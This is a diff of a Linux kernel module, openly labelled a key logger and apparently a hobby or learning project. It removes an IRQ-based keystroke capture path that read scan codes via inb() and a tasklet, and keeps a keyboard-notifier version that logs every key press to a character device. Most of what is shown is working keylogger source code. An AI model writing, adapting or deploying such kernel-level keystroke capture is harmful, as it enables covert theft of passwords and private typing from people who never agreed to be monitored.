@@ -24,18 +24,6 @@
 #define DEF_LOG_INIT_MSG "***INITIALIZING LOG***\n"
 #define DEF_LOG_CLOSE_MSG "\n***CLOSING LOG***\n"
 
-#define SOLUTION 2
-#if SOLUTION == 1
-// SOLUTION #1 - ISR4IRQ
-// Intel-specific magic numbers
-#define KEYBOARD_IRQ 1
-#define KBD_STATUS_REG 0x64
-#define KBD_CNTL_REG 0x64
-#define KBD_DATA_REG 0x60
-#else
-// Placeholder SOLUTION 2
-#endif  // SOLUTION
-
 // CHAR DEVICE //
 #define CDEV_BUFF_SIZE 511
 
@@ -57,12 +45,7 @@
 #include <linux/semaphore.h>                    // semaphores
 #include <linux/stat.h>                         // File mode macros
 #include <linux/uaccess.h>                      // copy_to_user
-
-#if SOLUTION == 1
-#include <linux/interrupt.h>                    // irq_handler_t
-#else
 #include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()
-#endif  // SOLUTION
 
 //////////////
 /* TYPEDEFS */
@@ -93,19 +76,8 @@ static void __exit key_logger_exit(void);
 // PURPOSE - Translate scan code to 'key' string
 // RETURN - 1 for unsupported value, 0 on success, -1 on failure
 static int translate_code(unsigned char scanCode, char *buf);
-#if SOLUTION == 1
-// PURPOSE - Keyboard IRQ handler
-irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs);  // SOLUTION #1 - ISR4IRQ
-// PURPOSE - Converts scancode to key and writes it to log file
-void tasklet_logger(unsigned long data);
-// Registers the tasklet for logging keys.
-// NOTE: Apparently, it must immediately follow the prototype but precede the definition.
-// Likely because this macro expands to another function prototype.
-DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
-#else
 // PURPOSE - Respond to a key press notification
 int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param);
-#endif  // SOLUTION
 // PURPOSE - fops.open for the character device
 // INPUT
 //  inode - reference to the file on disk and contains information about that file
@@ -126,12 +98,8 @@ static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
 myKeyLogger myKL;
 myLogDevice myLD;
 int shift;
-#if SOLUTION == 1
-unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
-#else
 // Register this with the keyboard driver
 static struct notifier_block kl_notif_block = { .notifier_call = kl_module };
-#endif  // SOLUTION
 struct cdev *myCdev;            // My character device driver
 // This tells the kernel which functions to call when a user operates on our device file_operations
 struct file_operations fops =
@@ -169,26 +137,12 @@ static int __init key_logger_init(void)
 
     if (!retVal)
     {
-#if SOLUTION == 1
-        // Request to register a shared IRQ handler (ISR).
-        retVal = request_irq(KEYBOARD_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED, DEVICE_NAME, &sCode);
-
-        if (!retVal)
-        {
-            HARKLE_KFINFO(DEVICE_NAME, key_logger_init, "ISR registered");  // DEBUGGING
-        }
-        else
-        {
-            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "request_irq() failed to register a shared IRQ handler");  // DEBUGGING
-        }
-#else
         /*
          * Add to the list of console keyboard event
          * notifiers so the callback is
          * called when an event occurs.
          */
         register_keyboard_notifier(&kl_notif_block);
-#endif  // SOLUTION
     }
 
     // Setup character device
@@ -298,17 +252,7 @@ static int __init key_logger_init(void)
 static void __exit key_logger_exit(void)
 {
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
-
-#if SOLUTION == 1
-    // SOLUTION #1 - ISR4IRQ
-    // Free the logging tasklet.
-    tasklet_kill(&my_tasklet);
-
-    // Free the shared IRQ handler, giving system back original control.
-    free_irq(KEYBOARD_IRQ, &sCode);
-#else
     unregister_keyboard_notifier(&kl_notif_block);
-#endif  // SOLUTION
 
     // Teardown the character device
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
@@ -341,74 +285,6 @@ static void __exit key_logger_exit(void)
  *      - Appears to be most common
  */
 
-#if SOLUTION == 1
-// 1. ISR for a keyboard IRQ
-// NOTE: This implementation is adapted from:
-// https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
-
-// SOLUTION #1 - ISR4IRQ
-irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
-{
-    // Receive the scan code
-    sCode = inb(KBD_DATA_REG);
-
-    if (sCode)
-    {
-        // printk(KERN_DEBUG "inb() returned %u\n", sCode);  // DEBUGGING
-
-        /* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
-         * write the key to the log file at the next available time in a
-         * non-atomic context.
-         */
-        tasklet_schedule(&my_tasklet);
-    }
-
-    return (irq_handler_t)IRQ_HANDLED;
-}
-
-/* Converts scancode to key and writes it to log file. */
-void tasklet_logger(unsigned long data)
-{
-    // LOCAL VARIABLES
-    int msgLen = 0;  // Length of human readable string from converted scan code
-    int tempRetVal = 0;  // translate_code() return value
-
-    // 1. Convert data to string
-    tempRetVal = translate_code(sCode, myKL.keyStr);
-
-    if (-1 == tempRetVal)
-    // if (translate_code(data, myKL.keyStr))
-    {
-        HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "translate_code() has failed");  // DEBUGGING
-    }
-    else if (0 == tempRetVal)
-    {
-        msgLen = strlen(myKL.keyStr);
-
-        // 2. Write the string to the character device
-        if (msgLen > 0)
-        {
-            // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
-            tempRetVal = write_to_chrdev(&myLD, myKL.keyStr);
-            if (msgLen != tempRetVal)
-            // if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
-            {
-                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
-                printk(KERN_INFO "%s: write_to_chrdev() returned %d\n", DEVICE_NAME, tempRetVal);  // DEBUGGING
-                printk(KERN_INFO "%s: The message is of length %d\n", DEVICE_NAME, msgLen);  // DEBUGGING
-            }
-        }
-    }
-    else
-    {
-        // Unsupported value
-        // printk(KERN_DEBUG "Skipping unsupported value of %u\n", sCode);  // DEBUGGING
-    }
-
-    // DONE
-    return;
-}
-#else
 int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param)
 {
     // LOCAL VARIABLES
@@ -485,7 +361,6 @@ int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_para
 
     return retVal;
 }
-#endif  // SOLUTION
 
 static int translate_code(unsigned char scanCode, char *buf)
 {
@@ -883,4 +758,4 @@ module_exit(key_logger_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
 MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
-MODULE_VERSION("0.2"); // Not yet releasable
+MODULE_VERSION("0.5"); // Not yet releasable
